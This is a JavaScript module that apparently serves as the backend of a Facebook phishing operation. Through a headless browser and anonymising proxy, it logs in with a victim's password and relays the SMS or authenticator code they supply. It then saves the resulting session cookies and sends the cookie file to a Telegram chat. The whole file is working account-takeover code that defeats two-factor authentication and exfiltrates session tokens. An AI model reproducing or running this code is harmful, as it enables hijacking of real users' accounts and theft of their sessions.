const puppeteer = require('puppeteer');
const proxyChain = require('proxy-chain');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

let browser;
let page;
let checkSms;
let twoFactorMode;
let token;
let chatid;

async function initialize() {
    const proxyInfo = getConfigInfo();

    const launchOptions = {
        headless: 'new'
    };

    if (proxyInfo.host && proxyInfo.port && proxyInfo.username && proxyInfo.password) {
        const proxyUrl = `http://${proxyInfo.username}:${proxyInfo.password}@${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`
        ];
    }
    else if (proxyInfo.host && proxyInfo.port) {
        const proxyUrl = `http://${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`
        ];
    }
    else {
        launchOptions.args = [
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }

    browser = await puppeteer.launch(launchOptions);
    page = await browser.newPage();
}

async function check(username, password) {
    try {
        await page.goto('https://mbasic.facebook.com');
        await page.type('input[name="email"]', username);
        await page.type('input[name="pass"]', password);
        await page.click('input[type="submit"]');
        const loginError = await page.$('#login_error');
        if (loginError) {
            const text = await page.evaluate(() => {
                return 'WRONG'
            });
            await browser.close();
            return text;
        } else {
            const twoFactor = await page.$('#approvals_code');
            if (twoFactor) {
                checkSms = await browser.newPage();
                await checkSms.goto('https://mbasic.facebook.com/checkpoint/?having_trouble=1');
                const smsEnable = await checkSms.$('input[type="radio"][value="sms_requested"]');
                if (smsEnable) {
                    await checkSms.evaluate((element) => {
                        element.checked = true;
                    }, smsEnable);
                    await checkSms.click('input[type="submit"]');
                    twoFactorMode = 'SMS';
                    return 'SMS';
                }
                else {
                    await checkSms.close();
                    twoFactorMode = '2FA';
                    return '2FA';
                }
            } else {
                return 'SUCCESS';
            }
        }
    } catch (error) {
        return 'Đã xảy ra lỗi ' + error;
    }
}
async function saveCookies(state) {
    if (state === 'SUCCESS') {
        await page.click('input[type="submit"]');
        const cookies = (await page.cookies()).map(cookie => {
            delete cookie.sameSite;
            return cookie;
        });
        fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
    }
}
async function enterCode(code) {
    if (twoFactorMode === 'SMS') {
        checkSms.type('input[name="approvals_code"]', code);
        checkSms.click('input[type="submit"]');
    } else if (twoFactorMode === '2FA') {
        page.type('input[name="approvals_code"]', code);
        page.click('input[type="submit"]');
    }
}
function getConfigInfo() {
    const configInfo = JSON.parse(fs.readFileSync('config.json', 'utf8'));
    token = configInfo.token;
    chatid = configInfo.chatid;
    return configInfo;
}
async function sendTelegramMessage() {
    const bot = new TelegramBot(token, { polling: true });
    await bot.sendDocument(chatid, 'cookies.json');
}

async function close() {
    await browser.close();
}

module.exports = {
    initialize,
    check,
    enterCode,
    saveCookies,
    close
};